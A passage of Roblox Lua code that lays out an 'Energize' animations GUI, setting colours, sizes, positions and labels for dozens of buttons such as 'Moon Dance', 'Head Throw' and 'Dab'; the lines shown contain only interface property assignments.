OpenGUI.Position = UDim2.new(0, 426, 0, 0)
OpenGUI.Size = UDim2.new(0, 34, 0, 32)
OpenGUI.Font = Enum.Font.SourceSans
OpenGUI.FontSize = Enum.FontSize.Size48
OpenGUI.Text = "X"
OpenGUI.TextColor3 = Color3.new(0.333333, 0, 0)
OpenGUI.TextSize = 40
OpenGUI.TextWrapped = true
 
SideFrameTitle.Name = "SideFrameTitle"
SideFrameTitle.Parent = SideFrame
SideFrameTitle.BackgroundColor3 = Color3.new(1, 1, 1)
SideFrameTitle.BackgroundTransparency = 1
SideFrameTitle.Position = UDim2.new(0, 170, 0, 0)
SideFrameTitle.Size = UDim2.new(0, 119, 0, 31)
SideFrameTitle.Font = Enum.Font.Arial
SideFrameTitle.FontSize = Enum.FontSize.Size24
SideFrameTitle.Text = "Energize"
SideFrameTitle.TextSize = 21
SideFrameTitle.TextStrokeColor3 = Color3.new(0.27451, 0.92549, 0.905882)
SideFrameTitle.TextStrokeTransparency = 0.69999998807907
 
MainFrame.Name = "MainFrame"
MainFrame.Parent = Energize
MainFrame.Active = true
MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainFrame.BackgroundTransparency = 1
MainFrame.Draggable = true
MainFrame.Position = UDim2.new(0, 376, 0, 125)
MainFrame.Size = UDim2.new(0, 444, 0, 280)
 
GuiBottomFrame.Name = "Gui BottomFrame"
GuiBottomFrame.Parent = MainFrame
GuiBottomFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
GuiBottomFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
GuiBottomFrame.Position = UDim2.new(0, 0, 0, 247)
GuiBottomFrame.Size = UDim2.new(0, 460, 0, 32)
 
Credits.Name = "Credits"
Credits.Parent = GuiBottomFrame
Credits.BackgroundColor3 = Color3.new(1, 1, 1)
Credits.BackgroundTransparency = 1
Credits.Size = UDim2.new(0, 460, 0, 32)
Credits.FontSize = Enum.FontSize.Size14
Credits.Text = "By gearv4#0 Animations Gui"
Credits.TextColor3 = Color3.new(0.219608, 0.219608, 0.219608)
Credits.TextSize = 14
Credits.TextStrokeColor3 = Color3.new(0.141176, 0.870588, 0.713726)
Credits.TextStrokeTransparency = 0.69999998807907
Credits.TextWrapped = true
 
ScrollingFrame.Parent = MainFrame
ScrollingFrame.BackgroundColor3 = Color3.new(1, 0.564706, 0.564706)
ScrollingFrame.Position = UDim2.new(0, 0, 0, 32)
ScrollingFrame.Size = UDim2.new(0, 460, 0, 215)
ScrollingFrame.ScrollBarThickness = 13
 
FullSwing.Name = "FullSwing"
FullSwing.Parent = ScrollingFrame
FullSwing.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FullSwing.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FullSwing.Position = UDim2.new(0, 17, 0, 322)
FullSwing.Size = UDim2.new(0, 119, 0, 34)
FullSwing.Font = Enum.Font.Highway
FullSwing.FontSize = Enum.FontSize.Size24
FullSwing.Text = "Full Swing"
FullSwing.TextSize = 20
FullSwing.TextWrapped = true
 
GlitchLevitate.Name = "GlitchLevitate"
GlitchLevitate.Parent = ScrollingFrame
GlitchLevitate.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
GlitchLevitate.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
GlitchLevitate.Position = UDim2.new(0, 319, 0, 322)
GlitchLevitate.Size = UDim2.new(0, 119, 0, 34)
GlitchLevitate.Font = Enum.Font.Highway
GlitchLevitate.FontSize = Enum.FontSize.Size24
GlitchLevitate.Text = "Glitch Levitate"
GlitchLevitate.TextSize = 20
GlitchLevitate.TextWrapped = true
 
MoonDance.Name = "MoonDance"
MoonDance.Parent = ScrollingFrame
MoonDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
MoonDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
MoonDance.Position = UDim2.new(0, 319, 0, 280)
MoonDance.Size = UDim2.new(0, 119, 0, 34)
MoonDance.Font = Enum.Font.Highway
MoonDance.FontSize = Enum.FontSize.Size24
MoonDance.Text = "Moon Dance"
MoonDance.TextSize = 20
MoonDance.TextWrapped = true
 
FullPunch.Name = "FullPunch"
FullPunch.Parent = ScrollingFrame
FullPunch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FullPunch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FullPunch.Position = UDim2.new(0, 17, 0, 280)
FullPunch.Size = UDim2.new(0, 119, 0, 34)
FullPunch.Font = Enum.Font.Highway
FullPunch.FontSize = Enum.FontSize.Size24
FullPunch.Text = "Full Punch"
FullPunch.TextSize = 20
FullPunch.TextWrapped = true
 
Crouch.Name = "Crouch"
Crouch.Parent = ScrollingFrame
Crouch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Crouch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Crouch.Position = UDim2.new(0, 168, 0, 280)
Crouch.Size = UDim2.new(0, 119, 0, 34)
Crouch.Font = Enum.Font.Highway
Crouch.FontSize = Enum.FontSize.Size24
Crouch.Text = "Crouch"
Crouch.TextSize = 20
Crouch.TextWrapped = true
 
SpinDance.Name = "SpinDance"
SpinDance.Parent = ScrollingFrame
SpinDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SpinDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SpinDance.Position = UDim2.new(0, 168, 0, 236)
SpinDance.Size = UDim2.new(0, 119, 0, 34)
SpinDance.Font = Enum.Font.Highway
SpinDance.FontSize = Enum.FontSize.Size24
SpinDance.Text = "Spin Dance"
SpinDance.TextSize = 20
SpinDance.TextWrapped = true
 
FloorFaint.Name = "FloorFaint"
FloorFaint.Parent = ScrollingFrame
FloorFaint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloorFaint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloorFaint.Position = UDim2.new(0, 17, 0, 236)
FloorFaint.Size = UDim2.new(0, 119, 0, 34)
FloorFaint.Font = Enum.Font.Highway
FloorFaint.FontSize = Enum.FontSize.Size24
FloorFaint.Text = "Floor Faint"
FloorFaint.TextSize = 20
FloorFaint.TextWrapped = true
 
JumpingJacks.Name = "JumpingJacks"
JumpingJacks.Parent = ScrollingFrame
JumpingJacks.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
JumpingJacks.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
JumpingJacks.Position = UDim2.new(0, 319, 0, 236)
JumpingJacks.Size = UDim2.new(0, 119, 0, 34)
JumpingJacks.Font = Enum.Font.Highway
JumpingJacks.FontSize = Enum.FontSize.Size24
JumpingJacks.Text = "Jumping Jacks"
JumpingJacks.TextSize = 20
JumpingJacks.TextWrapped = true
 
Spinner.Name = "Spinner"
Spinner.Parent = ScrollingFrame
Spinner.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Spinner.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Spinner.Position = UDim2.new(0, 17, 0, 192)
Spinner.Size = UDim2.new(0, 119, 0, 34)
Spinner.Font = Enum.Font.Highway
Spinner.FontSize = Enum.FontSize.Size24
Spinner.Text = "Spinner"
Spinner.TextSize = 20
Spinner.TextWrapped = true
 
MegaInsane.Name = "MegaInsane"
MegaInsane.Parent = ScrollingFrame
MegaInsane.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
MegaInsane.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
MegaInsane.Position = UDim2.new(0, 168, 0, 192)
MegaInsane.Size = UDim2.new(0, 119, 0, 34)
MegaInsane.Font = Enum.Font.Highway
MegaInsane.FontSize = Enum.FontSize.Size24
MegaInsane.Text = "Mega Insane"
MegaInsane.TextSize = 20
MegaInsane.TextWrapped = true
 
ArmDetach.Name = "ArmDetach"
ArmDetach.Parent = ScrollingFrame
ArmDetach.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
ArmDetach.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
ArmDetach.Position = UDim2.new(0, 319, 0, 192)
ArmDetach.Size = UDim2.new(0, 119, 0, 34)
ArmDetach.Font = Enum.Font.Highway
ArmDetach.FontSize = Enum.FontSize.Size24
ArmDetach.Text = "Arm Detach"
ArmDetach.TextSize = 20
ArmDetach.TextWrapped = true
 
WeirdMove.Name = "WeirdMove"
WeirdMove.Parent = ScrollingFrame
WeirdMove.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
WeirdMove.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
WeirdMove.Position = UDim2.new(0, 168, 0, 148)
WeirdMove.Size = UDim2.new(0, 119, 0, 34)
WeirdMove.Font = Enum.Font.Highway
WeirdMove.FontSize = Enum.FontSize.Size24
WeirdMove.Text = "Weird Move"
WeirdMove.TextSize = 20
WeirdMove.TextWrapped = true
 
Faint.Name = "Faint"
Faint.Parent = ScrollingFrame
Faint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Faint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Faint.Position = UDim2.new(0, 17, 0, 148)
Faint.Size = UDim2.new(0, 119, 0, 34)
Faint.Font = Enum.Font.Highway
Faint.FontSize = Enum.FontSize.Size24
Faint.Text = "Faint"
Faint.TextSize = 20
Faint.TextWrapped = true
 
CloneIllusion.Name = "CloneIllusion"
CloneIllusion.Parent = ScrollingFrame
CloneIllusion.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
CloneIllusion.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
CloneIllusion.Position = UDim2.new(0, 319, 0, 148)
CloneIllusion.Size = UDim2.new(0, 119, 0, 34)
CloneIllusion.Font = Enum.Font.Highway
CloneIllusion.FontSize = Enum.FontSize.Size24
CloneIllusion.Text = "Clone Illusion"
CloneIllusion.TextSize = 20
CloneIllusion.TextWrapped = true
 
Levitate.Name = "Levitate"
Levitate.Parent = ScrollingFrame
Levitate.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Levitate.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Levitate.Position = UDim2.new(0, 17, 0, 104)
Levitate.Size = UDim2.new(0, 119, 0, 34)
Levitate.Font = Enum.Font.Highway
Levitate.FontSize = Enum.FontSize.Size24
Levitate.Text = "Levitate"
Levitate.TextSize = 20
Levitate.TextWrapped = true
 
DinoWalk.Name = "DinoWalk"
DinoWalk.Parent = ScrollingFrame
DinoWalk.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
DinoWalk.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
DinoWalk.Position = UDim2.new(0, 168, 0, 104)
DinoWalk.Size = UDim2.new(0, 119, 0, 34)
DinoWalk.Font = Enum.Font.Highway
DinoWalk.FontSize = Enum.FontSize.Size24
DinoWalk.Text = "Dino Walk"
DinoWalk.TextSize = 20
DinoWalk.TextWrapped = true
 
FloorCrawl.Name = "FloorCrawl"
FloorCrawl.Parent = ScrollingFrame
FloorCrawl.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloorCrawl.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloorCrawl.Position = UDim2.new(0, 319, 0, 104)
FloorCrawl.Size = UDim2.new(0, 119, 0, 34)
FloorCrawl.Font = Enum.Font.Highway
FloorCrawl.FontSize = Enum.FontSize.Size24
FloorCrawl.Text = "Floor Crawl"
FloorCrawl.TextSize = 20
FloorCrawl.TextWrapped = true
 
SwordSlam.Name = "SwordSlam"
SwordSlam.Parent = ScrollingFrame
SwordSlam.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SwordSlam.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SwordSlam.Position = UDim2.new(0, 319, 0, 60)
SwordSlam.Size = UDim2.new(0, 119, 0, 34)
SwordSlam.Font = Enum.Font.Highway
SwordSlam.FontSize = Enum.FontSize.Size24
SwordSlam.Text = "Sword Slam"
SwordSlam.TextSize = 20
SwordSlam.TextWrapped = true
 
LoopHead.Name = "LoopHead"
LoopHead.Parent = ScrollingFrame
LoopHead.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
LoopHead.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
LoopHead.Position = UDim2.new(0, 168, 0, 60)
LoopHead.Size = UDim2.new(0, 119, 0, 34)
LoopHead.Font = Enum.Font.Highway
LoopHead.FontSize = Enum.FontSize.Size24
LoopHead.Text = "Loop Head"
LoopHead.TextSize = 20
LoopHead.TextWrapped = true
 
HeroJump.Name = "HeroJump"
HeroJump.Parent = ScrollingFrame
HeroJump.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
HeroJump.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
HeroJump.Position = UDim2.new(0, 17, 0, 60)
HeroJump.Size = UDim2.new(0, 119, 0, 34)
HeroJump.Font = Enum.Font.Highway
HeroJump.FontSize = Enum.FontSize.Size24
HeroJump.Text = "Hero Jump"
HeroJump.TextSize = 20
HeroJump.TextWrapped = true
 
Insane.Name = "Insane"
Insane.Parent = ScrollingFrame
Insane.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Insane.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Insane.Position = UDim2.new(0, 319, 0, 16)
Insane.Size = UDim2.new(0, 119, 0, 34)
Insane.Font = Enum.Font.Highway
Insane.FontSize = Enum.FontSize.Size24
Insane.Text = "Insane"
Insane.TextSize = 20
Insane.TextWrapped = true
 
FloatingHead.Name = "FloatingHead"
FloatingHead.Parent = ScrollingFrame
FloatingHead.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloatingHead.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloatingHead.Position = UDim2.new(0, 168, 0, 16)
FloatingHead.Size = UDim2.new(0, 119, 0, 34)
FloatingHead.Font = Enum.Font.Highway
FloatingHead.FontSize = Enum.FontSize.Size24
FloatingHead.Text = "Floating Head"
FloatingHead.TextSize = 20
FloatingHead.TextWrapped = true
 
HeadThrow.Name = "HeadThrow"
HeadThrow.Parent = ScrollingFrame
HeadThrow.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
HeadThrow.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
HeadThrow.Position = UDim2.new(0, 17, 0, 16)
HeadThrow.Size = UDim2.new(0, 119, 0, 34)
HeadThrow.Font = Enum.Font.Highway
HeadThrow.FontSize = Enum.FontSize.Size24
HeadThrow.Text = "Head Throw"
HeadThrow.TextSize = 20
HeadThrow.TextWrapped = true
 
MovingDance.Name = "MovingDance"
MovingDance.Parent = ScrollingFrame
MovingDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
MovingDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
MovingDance.Position = UDim2.new(0, 168, 0, 324)
MovingDance.Size = UDim2.new(0, 119, 0, 34)
MovingDance.Font = Enum.Font.Highway
MovingDance.FontSize = Enum.FontSize.Size24
MovingDance.Text = "Moving Dance"
MovingDance.TextSize = 20
MovingDance.TextWrapped = true
 
SuperPunch.Name = "SuperPunch"
SuperPunch.Parent = ScrollingFrame
SuperPunch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SuperPunch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SuperPunch.Position = UDim2.new(0, 168, 0, 366)
SuperPunch.Size = UDim2.new(0, 119, 0, 34)
SuperPunch.Font = Enum.Font.Highway
SuperPunch.FontSize = Enum.FontSize.Size24
SuperPunch.Text = "Super Punch"
SuperPunch.TextSize = 20
SuperPunch.TextWrapped = true
 
ArmTurbine.Name = "ArmTurbine"
ArmTurbine.Parent = ScrollingFrame
ArmTurbine.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
ArmTurbine.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
ArmTurbine.Position = UDim2.new(0, 319, 0, 366)
ArmTurbine.Size = UDim2.new(0, 119, 0, 34)
ArmTurbine.Font = Enum.Font.Highway
ArmTurbine.FontSize = Enum.FontSize.Size24
ArmTurbine.Text = "Arm Turbine"
ArmTurbine.TextSize = 20
ArmTurbine.TextWrapped = true
 
Dab.Name = "Dab"
Dab.Parent = ScrollingFrame
Dab.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Dab.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Dab.Position = UDim2.new(0, 17, 0, 366)
Dab.Size = UDim2.new(0, 119, 0, 34)
Dab.Font = Enum.Font.Highway
Dab.FontSize = Enum.FontSize.Size24
Dab.Text = "Dab"
Dab.TextSize = 20
Dab.TextWrapped = true
 
FloatSit.Name = "FloatSit"
FloatSit.Parent = ScrollingFrame
FloatSit.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloatSit.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloatSit.Position = UDim2.new(0, 168, 0, 410)
FloatSit.Size = UDim2.new(0, 119, 0, 34)
FloatSit.Font = Enum.Font.Highway
FloatSit.FontSize = Enum.FontSize.Size24
FloatSit.Text = "Float Sit"
FloatSit.TextSize = 20
FloatSit.TextWrapped = true
 
SuperFaint.Name = "SuperFaint"
SuperFaint.Parent = ScrollingFrame
SuperFaint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SuperFaint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SuperFaint.Position = UDim2.new(0, 17, 0, 498)
SuperFaint.Size = UDim2.new(0, 119, 0, 34)
SuperFaint.Font = Enum.Font.Highway
SuperFaint.FontSize = Enum.FontSize.Size24
SuperFaint.Text = "Super Faint"
SuperFaint.TextSize = 20
SuperFaint.TextWrapped = true
 
BarrelRoll.Name = "BarrelRoll"
BarrelRoll.Parent = ScrollingFrame
BarrelRoll.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
BarrelRoll.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
BarrelRoll.Position = UDim2.new(0, 319, 0, 410)
BarrelRoll.Size = UDim2.new(0, 119, 0, 34)
BarrelRoll.Font = Enum.Font.Highway
BarrelRoll.FontSize = Enum.FontSize.Size24
BarrelRoll.Text = "Barrel Roll"
BarrelRoll.TextSize = 20
BarrelRoll.TextWrapped = true
 
Scared.Name = "Scared"
Scared.Parent = ScrollingFrame
Scared.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Scared.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Scared.Position = UDim2.new(0, 319, 0, 454)
Scared.Size = UDim2.new(0, 119, 0, 34)
Scared.Font = Enum.Font.Highway
Scared.FontSize = Enum.FontSize.Size24
Scared.Text = "Scared"
Scared.TextSize = 20
Scared.TextWrapped = true
 
InsaneArms.Name = "InsaneArms"
InsaneArms.Parent = ScrollingFrame
InsaneArms.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
InsaneArms.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
InsaneArms.Position = UDim2.new(0, 17, 0, 454)
InsaneArms.Size = UDim2.new(0, 119, 0, 34)
InsaneArms.Font = Enum.Font.Highway
InsaneArms.FontSize = Enum.FontSize.Size24
InsaneArms.Text = "Insane Arms"
InsaneArms.TextSize = 20
InsaneArms.TextWrapped = true
 
SwordSlice.Name = "SwordSlice"
SwordSlice.Parent = ScrollingFrame
SwordSlice.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SwordSlice.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SwordSlice.Position = UDim2.new(0, 168, 0, 454)
SwordSlice.Size = UDim2.new(0, 119, 0, 34)
SwordSlice.Font = Enum.Font.Highway
SwordSlice.FontSize = Enum.FontSize.Size24
SwordSlice.Text = "Sword Slice"
SwordSlice.TextSize = 20
SwordSlice.TextWrapped = true
 
SpinDance2.Name = "SpinDance2"
SpinDance2.Parent = ScrollingFrame
SpinDance2.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SpinDance2.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SpinDance2.Position = UDim2.new(0, 168, 0, 498)
SpinDance2.Size = UDim2.new(0, 119, 0, 34)
SpinDance2.Font = Enum.Font.Highway
SpinDance2.FontSize = Enum.FontSize.Size24
SpinDance2.Text = "Spin Dance 2"
SpinDance2.TextSize = 20
SpinDance2.TextWrapped = true
 
BowDown.Name = "BowDown"
BowDown.Parent = ScrollingFrame
BowDown.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
BowDown.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
BowDown.Position = UDim2.new(0, 319, 0, 498)
BowDown.Size = UDim2.new(0, 119, 0, 34)
BowDown.Font = Enum.Font.Highway
BowDown.FontSize = Enum.FontSize.Size24
BowDown.Text = "Bow Down"
BowDown.TextSize = 20
BowDown.TextWrapped = true
 
LoopSlam.Name = "LoopSlam"
LoopSlam.Parent = ScrollingFrame
LoopSlam.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
LoopSlam.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
LoopSlam.Position = UDim2.new(0, 17, 0, 410)
LoopSlam.Size = UDim2.new(0, 119, 0, 34)
LoopSlam.Font = Enum.Font.Highway
LoopSlam.FontSize = Enum.FontSize.Size24
LoopSlam.Text = "Loop Slam"
LoopSlam.TextSize = 20
LoopSlam.TextWrapped = true
 
GuiTopFrame.Name = "Gui TopFrame"
GuiTopFrame.Parent = MainFrame
GuiTopFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
GuiTopFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
GuiTopFrame.Size = UDim2.new(0, 460, 0, 32)
 
CloseGUI.Name = "CloseGUI"
CloseGUI.Parent = GuiTopFrame
CloseGUI.BackgroundColor3 = Color3.new(1, 1, 1)
CloseGUI.BackgroundTransparency = 1
CloseGUI.Position = UDim2.new(0, 426, 0, 0)
CloseGUI.Size = UDim2.new(0, 34, 0, 32)
CloseGUI.Font = Enum.Font.SourceSans
CloseGUI.FontSize = Enum.FontSize.Size48
CloseGUI.Text = "X"
CloseGUI.TextColor3 = Color3.new(0.333333, 0, 0)
CloseGUI.TextSize = 40
CloseGUI.TextWrapped = true
 
Title.Name = "Title"
Title.Parent = GuiTopFrame
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(0, 460, 0, 32)
Title.FontSize = Enum.FontSize.Size14
Title.Text = "Energize"
Title.TextColor3 = Color3.new(0.164706, 0.164706, 0.164706)
Title.TextSize = 14
Title.TextStrokeColor3 = Color3.new(0.384314, 0.917647, 1)
Title.TextStrokeTransparency = 0.69999998807907
Title.TextWrapped = true
 
CheckR.Name = "CheckR"
CheckR.Parent = GuiTopFrame
CheckR.BackgroundColor3 = Color3.new(1, 1, 1)
CheckR.BackgroundTransparency = 1
CheckR.Size = UDim2.new(0, 171, 0, 32)
CheckR.Font = Enum.Font.SourceSansBold
CheckR.FontSize = Enum.FontSize.Size14
CheckR.Text = "Text"
CheckR.TextScaled = true
CheckR.TextSize = 14
CheckR.TextWrapped = true
 
ScrollingFrameR15.Name = "ScrollingFrameR15"
ScrollingFrameR15.Parent = MainFrame
ScrollingFrameR15.BackgroundColor3 = Color3.new(1, 0.564706, 0.564706)
ScrollingFrameR15.Position = UDim2.new(0, 0, 0, 32)
ScrollingFrameR15.Size = UDim2.new(0, 460, 0, 215)
ScrollingFrameR15.Visible = false
ScrollingFrameR15.ScrollBarThickness = 13
 
CrazySlash.Name = "CrazySlash"
CrazySlash.Parent = ScrollingFrameR15
CrazySlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
CrazySlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
CrazySlash.Position = UDim2.new(0, 17, 0, 16)
CrazySlash.Size = UDim2.new(0, 119, 0, 34)
CrazySlash.Font = Enum.Font.Highway
CrazySlash.FontSize = Enum.FontSize.Size24
CrazySlash.Text = "CrazySlash"
CrazySlash.TextSize = 20
CrazySlash.TextWrapped = true
 
Open.Name = "Open"
Open.Parent = ScrollingFrameR15
Open.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
Open.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Open.Position = UDim2.new(0, 168, 0, 16)
Open.Size = UDim2.new(0, 119, 0, 34)
Open.Font = Enum.Font.Highway
Open.FontSize = Enum.FontSize.Size24
Open.Text = "Open"
Open.TextSize = 20
Open.TextWrapped = true
 
R15Spinner.Name = "R15Spinner"
R15Spinner.Parent = ScrollingFrameR15
R15Spinner.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
R15Spinner.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
R15Spinner.Position = UDim2.new(0, 17, 0, 60)
R15Spinner.Size = UDim2.new(0, 119, 0, 34)
R15Spinner.Font = Enum.Font.Highway
R15Spinner.FontSize = Enum.FontSize.Size24
R15Spinner.Text = "Spinner"
R15Spinner.TextSize = 20
R15Spinner.TextWrapped = true
 
ArmsOut.Name = "ArmsOut"
ArmsOut.Parent = ScrollingFrameR15
ArmsOut.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
ArmsOut.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
ArmsOut.Position = UDim2.new(0, 319, 0, 16)
ArmsOut.Size = UDim2.new(0, 119, 0, 34)
ArmsOut.Font = Enum.Font.Highway
ArmsOut.FontSize = Enum.FontSize.Size24
ArmsOut.Text = "ArmsOut"
ArmsOut.TextSize = 20
ArmsOut.TextWrapped = true
 
FloatSlash.Name = "FloatSlash"
FloatSlash.Parent = ScrollingFrameR15
FloatSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
FloatSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloatSlash.Position = UDim2.new(0, 168, 0, 148)
FloatSlash.Size = UDim2.new(0, 119, 0, 34)
FloatSlash.Font = Enum.Font.Highway
FloatSlash.FontSize = Enum.FontSize.Size24
FloatSlash.Text = "FloatSlash"
FloatSlash.TextSize = 20
FloatSlash.TextWrapped = true
 
WeirdZombie.Name = "WeirdZombie"
WeirdZombie.Parent = ScrollingFrameR15
WeirdZombie.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
WeirdZombie.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
WeirdZombie.Position = UDim2.new(0, 17, 0, 148)
WeirdZombie.Size = UDim2.new(0, 119, 0, 34)
WeirdZombie.Font = Enum.Font.Highway
WeirdZombie.FontSize = Enum.FontSize.Size24
WeirdZombie.Text = "WeirdZombie"
WeirdZombie.TextSize = 20
WeirdZombie.TextWrapped = true
 
DownSlash.Name = "DownSlash"
DownSlash.Parent = ScrollingFrameR15
DownSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
DownSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
DownSlash.Position = UDim2.new(0, 319, 0, 148)
DownSlash.Size = UDim2.new(0, 119, 0, 34)
DownSlash.Font = Enum.Font.Highway
DownSlash.FontSize = Enum.FontSize.Size24
DownSlash.Text = "DownSlash"
DownSlash.TextSize = 20
DownSlash.TextWrapped = true
 
Pull.Name = "Pull"
Pull.Parent = ScrollingFrameR15
Pull.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
Pull.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Pull.Position = UDim2.new(0, 17, 0, 104)
Pull.Size = UDim2.new(0, 119, 0, 34)
Pull.Font = Enum.Font.Highway
Pull.FontSize = Enum.FontSize.Size24
Pull.Text = "Pull"
Pull.TextSize = 20
Pull.TextWrapped = true
 
CircleArm.Name = "CircleArm"
CircleArm.Parent = ScrollingFrameR15
CircleArm.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
CircleArm.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
CircleArm.Position = UDim2.new(0, 168, 0, 104)
CircleArm.Size = UDim2.new(0, 119, 0, 34)
CircleArm.Font = Enum.Font.Highway
CircleArm.FontSize = Enum.FontSize.Size24
CircleArm.Text = "CircleArm"
CircleArm.TextSize = 20
CircleArm.TextWrapped = true
 
Bend.Name = "Bend"
Bend.Parent = ScrollingFrameR15
Bend.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
Bend.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Bend.Position = UDim2.new(0, 319, 0, 104)
Bend.Size = UDim2.new(0, 119, 0, 34)
Bend.Font = Enum.Font.Highway
Bend.FontSize = Enum.FontSize.Size24
Bend.Text = "Bend"
Bend.TextSize = 20
Bend.TextWrapped = true
 
RotateSlash.Name = "RotateSlash"
RotateSlash.Parent = ScrollingFrameR15
RotateSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
RotateSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
RotateSlash.Position = UDim2.new(0, 319, 0, 60)
RotateSlash.Size = UDim2.new(0, 119, 0, 34)
RotateSlash.Font = Enum.Font.Highway
RotateSlash.FontSize = Enum.FontSize.Size24
RotateSlash.Text = "RotateSlash"
RotateSlash.TextSize = 20
RotateSlash.TextWrapped = true
 
FlingArms.Name = "FlingArms"
FlingArms.Parent = ScrollingFrameR15
FlingArms.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
